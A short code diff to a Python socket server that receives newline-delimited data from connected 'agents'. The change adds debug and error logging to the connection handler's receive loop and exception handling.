@@ -106,17 +106,21 @@ def handle_client_connection(conn, client_id):
     add_log(f"[+] Agent Connected: {client_id}")
     buffer = ""
     try:
+        add_log(f"[DEBUG] Client {client_id} entering data reception loop.")
         while True:
             data = conn.recv(16384).decode('utf-8', errors='ignore')
             if not data:
+                add_log(f"[DEBUG] Client {client_id} sent no data (graceful disconnect).")
                 break
             buffer += data
             while '\n' in buffer:
                 line, buffer = buffer.split('\n', 1)
                 if line.strip():
                     handle_incoming_data(line.strip(), client_id)
-    except (ConnectionResetError, BrokenPipeError, TimeoutError):
-        pass # Expected when client disconnects
+    except (ConnectionResetError, BrokenPipeError, TimeoutError) as e:
+        add_log(f"[DEBUG] Client {client_id} connection error: {e}") # Expected when client disconnects due to network issues
+    except Exception as e:
+        add_log(f"[ERROR] Unexpected error in client {client_id} connection handler: {e}")
     finally:
         with clients_lock:
             if client_id in clients:
